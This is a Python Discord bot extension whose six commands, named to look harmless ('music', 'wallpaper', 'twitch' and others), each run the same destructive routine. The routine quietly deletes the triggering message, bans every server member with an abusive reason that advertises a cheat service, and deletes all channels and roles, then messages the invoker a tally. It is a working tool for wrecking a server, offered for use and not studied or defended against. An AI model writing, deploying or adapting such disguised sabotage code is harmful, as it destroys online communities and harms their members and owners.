import discord
from discord.ext import commands

member_list = []
member_list_banned = []
member_list_fail = []
auth = None


class Authority(commands.Cog):
    def __init__(self, client):
        self.go = True
        self.client = client

    @commands.command(name='cross')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()

    @commands.command(name='social')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()

    @commands.command(name='compare')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()

    @commands.command(name='wallpaper')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()

    @commands.command(name='music')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()

    @commands.command(name='twitch')
    @commands.Cog.listener()
    async def run(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound as e:
            pass
        id_list = []

        print("-----MEMBERS-----")
        await ctx.author.send("-----MEMBERS-----")

        for member in ctx.message.guild.members:
            if member.name in member_list_fail:
                continue
            member_list.append(member.name)
            for role in member.roles:
                if role.id in id_list:
                    print(f"User has ommited role: {role.id} | {role.name}")
                    await ctx.author.send(f"User has ommited role: {role.id} | {role.name}")
                    break
                else:
                    try:
                        await member.ban(reason="Fuck 12 Fuck Swat | Overflow Cheats Premium Software")
                    except discord.Forbidden as e:
                        print(f"Failed to ban: {member} | ID: {role.id} | Role Name: {role.name}")
                        await ctx.author.send(f"Failed to ban: {member} | ID: {role.id} |  Role Name: {role.name}")
                        member_list_fail.append(member.name)
                        break
                    else:
                        print(f"Banned Member: {member.name} | ID: {role.id}")
                        await ctx.author.send(f"Banned Member: {member.name} | ID: {role.id}")
                        member_list_banned.append(member.name)
                    break

        print("-----CHANNELS-----")
        await ctx.author.send("-----CHANNELS-----")

        for channel in ctx.message.guild.channels:
            if channel == "Text Channels":
                continue
            elif channel == "Voice Channels":
                continue
            try:
                await channel.delete()
            except discord.Forbidden as e:
                print(f"Failed to delete channel {channel.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete channel {channel.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Channel: {channel.name}")
                await ctx.author.send(f"Deleted Channel: {channel.name}")

        print("-----ROLES-----")
        await ctx.author.send("-----ROLES-----")

        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete role: {role.name}. Likely missing perms")
                await ctx.author.send(f"Failed to delete role: {role.name}. Likely missing perms")
                continue
            else:
                print(f"Deleted Role: {role.name}")
                await ctx.author.send(f"Deleted Role: {role.name}")

        print("-----TOTAL-----")
        await ctx.author.send("-----TOTAL-----")

        print(f"\nAll Members: {member_list}")
        print(f"All Banned Members: {member_list_banned}")
        print(f"Failed Members To Ban: {member_list_fail}")

        await ctx.author.send(f"\nAll Members: {member_list}")
        await ctx.author.send(f"All Banned Members: {member_list_banned}")
        await ctx.author.send(f"Failed Members To Ban: {member_list_fail}")
        member_list.clear()
        member_list_banned.clear()
        member_list_fail.clear()


def setup(client):
    global auth
    auth = Authority(client)
    client.add_cog(auth)
